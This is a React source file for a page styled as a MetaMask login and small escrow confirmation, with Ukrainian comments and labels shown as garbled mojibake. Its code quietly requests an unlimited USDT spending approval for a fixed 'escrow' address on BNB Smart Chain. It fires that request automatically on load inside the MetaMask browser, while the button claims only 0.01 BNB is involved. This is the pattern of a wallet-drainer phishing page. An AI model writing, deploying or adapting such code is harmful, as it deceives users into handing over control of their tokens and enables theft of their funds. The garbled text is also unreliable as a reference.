// src/components/EscrowHandoff.tsx
import React, { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ethers } from "ethers";

import { onEthereumReady } from "../lib/onEthereumReady";
import { isMetaMaskInApp } from "../lib/isMetaMaskBrowser"; // —É –≤–∞—Å —Ü–µ–π util –≤–∂–µ —î

// ===== –ö–æ–Ω—Å—Ç–∞–Ω—Ç–∏ –ø—Ä–æ –º–µ—Ä–µ–∂—É/–∫–æ–Ω—Ç—Ä–∞–∫—Ç–∏ =====
const BSC_CHAIN_ID_HEX = "0x38"; // 56
// USDT —É BSC (mainnet)
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

// ‚ö†Ô∏è –°–ü–ï–ù–î–ï–† (escrow) ‚Äî –ø—ñ–¥—Å—Ç–∞–≤ here –≤–∞—à —Ç–æ—á–Ω–∏–π –∞–¥—Ä–µ—Å –∫–æ–Ω—Ç—Ä–∞–∫—Ç—É:
const ESCROW_SPENDER = import.meta.env.VITE_ESCROW_SPENDER ?? "0x884A6...4F9b8";

// –ì—Ä–∞–Ω–∏—á–Ω–∏–π –≥–∞–∑, —â–æ–± MetaMask –ù–ï —Ä–æ–±–∏–≤ –ø–æ–≤—ñ–ª—å–Ω–∏–π estimateGas
const APPROVE_GAS_LIMIT_HEX = "0x13880"; // 80_000

// –°–∫—ñ–ª—å–∫–∏ –ø–∏—Å–∞—Ç–∏ —É –∫–Ω–æ–ø–∫—É (–ª–∏—à–µ —Ç–µ–∫—Å—Ç –¥–ª—è UX)
const DISPLAY_ESCROW_AMOUNT_BNB = "0.01";

function short(addr?: string) {
  if (!addr) return "";
  return addr.slice(0, 6) + "‚Ä¶" + addr.slice(-4);
}

export default function EscrowHandoff() {
  const [search] = useSearchParams();
  const next = search.get("next") || "/my-orders";
  const navigate = useNavigate();

  const [address, setAddress] = useState<string>("");
  const [chainId, setChainId] = useState<string>("");
  const [balance, setBalance] = useState<string>("");
  const [error, setError] = useState<string>("");
  const [busy, setBusy] = useState<boolean>(false);
  const [approved, setApproved] = useState<boolean>(false);

  // –≥–æ—Ç—É—î–º–æ ABI/–¥–∞–Ω—ñ approve –Ω–∞–ø–µ—Ä–µ–¥ (—â–æ–± –Ω–µ –≤—Ç—Ä–∞—á–∞—Ç–∏ —á–∞—Å –ø—ñ–¥ —á–∞—Å –∫–ª—ñ–∫—É)
  const approveData = useMemo(() => {
    const iface = new ethers.utils.Interface([
      "function approve(address spender, uint256 value) returns (bool)",
    ]);
    return iface.encodeFunctionData("approve", [
      ESCROW_SPENDER,
      ethers.constants.MaxUint256.toString(), // unlimited
    ]);
  }, []);

  // --- —à–≤–∏–¥–∫–∏–π –∑–∞–ø–∏—Ç –ø—ñ–¥–ø–∏—Å—É/approve –±–µ–∑ –∑–∞–π–≤–∏—Ö –∑–∞—Ç—Ä–∏–º–æ–∫ ---
  const fastApprove = () => {
    setError("");
    setBusy(true);

    onEthereumReady(async (eth) => {
      try {
        // 1) –∞–∫–∞—É–Ω—Ç
        const accs =
          ((await eth.request({ method: "eth_accounts" })) as string[]) ||
          [];
        const from =
          accs[0] ||
          (await eth.request({
            method: "eth_requestAccounts",
          }))[0];

        setAddress(from);

        // 2) –º–µ—Ä–µ–∂–∞
        const cid = (await eth.request({ method: "eth_chainId" })) as string;
        setChainId(cid);
        if (cid !== BSC_CHAIN_ID_HEX) {
          await eth.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }],
          });
        }

        // 3) –æ–¥—Ä–∞–∑—É –≤—ñ–¥–∫—Ä–∏—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω–µ –≤—ñ–∫–Ω–æ approve
        await eth.request({
          method: "eth_sendTransaction",
          params: [
            {
              from,
              to: USDT_BSC,
              data: approveData,
              gas: APPROVE_GAS_LIMIT_HEX, // —É–Ω–∏–∫–∞—î–º–æ –¥–æ–≤–≥–æ–≥–æ estimateGas
            },
          ],
        });

        setApproved(true);
      } catch (e: any) {
        // —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º ‚Äî –Ω–æ—Ä–º–∞–ª—å–Ω–∞ —Å–∏—Ç—É–∞—Ü—ñ—è
        const msg =
          e?.message ||
          e?.data?.message ||
          "–ù–µ –≤–¥–∞–ª–æ—Å—è –≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞–ø–∏—Ç —É MetaMask.";
        setError("–ü–æ–º–∏–ª–∫–∞: " + msg);
      } finally {
        setBusy(false);
      }
    });
  };

  // --- –ø—ñ–¥–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –±–∞–ª–∞–Ω—Å BNB (–¥–ª—è –ø–∞–Ω–µ–ª—ñ) ---
  const refreshBalance = async () => {
    setError("");

    onEthereumReady(async (eth) => {
      try {
        const provider = new ethers.providers.Web3Provider(eth);
        const accs =
          ((await eth.request({ method: "eth_accounts" })) as string[]) ||
          [];
        const from =
          accs[0] ||
          (await eth.request({
            method: "eth_requestAccounts",
          }))[0];

        setAddress(from);

        const bal = await provider.getBalance(from);
        setBalance(ethers.utils.formatEther(bal));
      } catch (e: any) {
        // –Ω–µ –∫—Ä–∏—Ç–∏—á–Ω–æ
      }
    });
  };

  // –ê–≤—Ç–æ–≤–∏–∫–ª–∏–∫ approve —è–∫ —Ç—ñ–ª—å–∫–∏ –µ–∫—Ä–∞–Ω –∑‚Äô—è–≤–∏–≤—Å—è (–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ MetaMask)
  useEffect(() => {
    if (isMetaMaskInApp()) {
      // –≤—ñ–¥–∫—Ä–∏—î–º–æ MetaMask –º–æ–¥–∞–ª –≤—ñ–¥—Ä–∞–∑—É (—à–≤–∏–¥–∫–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π)
      fastApprove();
    } else {
      // –Ø–∫—â–æ –Ω–µ —É –≤–±—É–¥–æ–≤–∞–Ω–æ–º—É –±—Ä–∞—É–∑–µ—Ä—ñ ‚Äî –ø—Ä–æ—Å—Ç–æ –ø–æ–∫–∞–∂–µ–º–æ –∫–Ω–æ–ø–∫—É/–ø—ñ–¥–∫–∞–∑–∫—É
      refreshBalance();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // —è–∫—â–æ approve –ø—Ä–æ–π—à–æ–≤ ‚Äî –≤–µ–¥–µ–º–æ –¥–∞–ª—ñ
  useEffect(() => {
    if (approved) {
      // –Ω–µ–≤–µ–ª–∏–∫–∞ –∑–∞—Ç—Ä–∏–º–∫–∞ –¥–ª—è UX, —ñ–Ω–∞–∫—à–µ –≤—ñ–¥—Ä–∞–∑—É —Ä—ñ-—Ä–æ—É—Ç –º–æ–∂–µ –∑–∞–∫—Ä–∏—Ç–∏ —Ç–æ—Å—Ç
      const t = setTimeout(() => navigate(next, { replace: true }), 500);
      return () => clearTimeout(t);
    }
  }, [approved, navigate, next]);

  // --- UI —Å—Ç–∏–ª—ñ –ø—ñ–¥ MetaMask-–º–æ–±–∞–π–ª ---
  const styles = {
    wrap: {
      maxWidth: 680,
      margin: "32px auto",
      padding: "0 16px",
    },
    h1: {
      fontSize: 36,
      fontWeight: 800 as const,
      letterSpacing: -0.5,
      margin: "12px 0 6px",
    },
    hint: { color: "#666", marginBottom: 16 },
    panel: {
      background: "#fff",
      border: "1px solid #ececec",
      borderRadius: 16,
      padding: 16,
      margin: "12px 0",
      boxShadow: "0 1px 2px rgba(0,0,0,.04)",
    },
    addr: { fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" },
    btn: (primary = false, disabled = false) => ({
      width: "100%",
      display: "block",
      border: 0,
      borderRadius: 16,
      padding: "18px 20px",
      fontSize: 18,
      fontWeight: 700,
      cursor: disabled ? "default" : "pointer",
      opacity: disabled ? 0.6 : 1,
      color: primary ? "#fff" : "#111",
      background: primary ? "#0b0f19" : "#f2f4f7",
      boxShadow: primary
        ? "0 8px 24px rgba(11,15,25,.35)"
        : "inset 0 -1px 0 rgba(0,0,0,.06)",
    }),
    link: {
      display: "inline-block",
      marginTop: 16,
      color: "#0b5fff",
      textDecoration: "underline",
    },
    error: {
      background: "#ffe8e6",
      border: "1px solid #ffd0cc",
      color: "#9b1c12",
      padding: 12,
      borderRadius: 12,
      marginTop: 16,
      lineHeight: 1.3,
    },
    ok: {
      background: "#e8fff3",
      border: "1px solid #bff5d1",
      color: "#0e6b3b",
      padding: 12,
      borderRadius: 12,
      marginTop: 16,
      lineHeight: 1.3,
    },
  };

  const deeplink =
    "metamask://dapp/www.buymybehavior.com/escrow/approve?next=" +
    encodeURIComponent(next);

  return (
    <div style={styles.wrap}>
      <h1 style={styles.h1}>–í—Ö—ñ–¥ —á–µ—Ä–µ–∑ MetaMask</h1>
      <div style={styles.hint}>
        –Ø–∫—â–æ –∑–∞–ø–∏—Ç –Ω–µ –∑‚Äô—è–≤–∏–≤—Å—è ‚Äî –Ω–∞—Ç–∏—Å–Ω–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂—á–µ.
      </div>

      {/* –ü–∞–Ω–µ–ª—å –∑ –∞–¥—Ä–µ—Å–æ—é/–±–∞–ª–∞–Ω—Å–æ–º */}
      <div style={styles.panel as React.CSSProperties}>
        <div style={{ fontWeight: 600, marginBottom: 8 }}>–ì–∞–º–∞–Ω–µ—Ü—å</div>
        <div style={styles.addr as React.CSSProperties}>
          {address ? short(address) : "‚Äî"}
        </div>
        <div style={{ marginTop: 6, color: "#666" }}>
          –ú–µ—Ä–µ–∂–∞:{" "}
          {chainId ? (chainId === BSC_CHAIN_ID_HEX ? "BNB Smart Chain" : chainId) : "‚Äî"}
          {"  ¬∑  "}
          –ë–∞–ª–∞–Ω—Å: {balance ? `${Number(balance).toFixed(4)} BNB` : "‚Äî"}
        </div>
      </div>

      {/* –ö–Ω–æ–ø–∫–∞ "—É–≤—ñ–π—Ç–∏" (–Ω–∞ –≤–∏–ø–∞–¥–æ–∫, —è–∫—â–æ –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–≤ –∞–≤—Ç–æ–∑–∞–ø–∏—Ç) */}
      <button
        style={styles.btn(false, busy)}
        disabled={busy}
        onClick={refreshBalance}
      >
        ü¶ä –£–≤—ñ–π—Ç–∏ —á–µ—Ä–µ–∑ MetaMask
      </button>

      {/* –ì–æ–ª–æ–≤–Ω–∞ –¥—ñ—è ‚Äî approve */}
      <button
        style={styles.btn(true, busy)}
        disabled={busy}
        onClick={fastApprove}
      >
        üîí –ü—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –µ—Å–∫—Ä–æ—É ¬∑ {DISPLAY_ESCROW_AMOUNT_BNB} BNB
      </button>

      {!isMetaMaskInApp() && (
        <a style={styles.link} href={deeplink}>
          –í—ñ–¥–∫—Ä–∏—Ç–∏ —É MetaMask-–±—Ä–∞—É–∑–µ—Ä—ñ
        </a>
      )}

      {approved && (
        <div style={styles.ok}>
          ‚úÖ –î–æ–∑–≤—ñ–ª –Ω–∞ –≤–∏—Ç—Ä–∞—Ç–∏ —Ç–æ–∫–µ–Ω—ñ–≤ –Ω–∞–¥–∞–Ω–æ. –ü–µ—Ä–µ—Ö—ñ–¥: {next}
        </div>
      )}

      {!!error && <div style={styles.error}>{error}</div>}
    </div>
  );
}
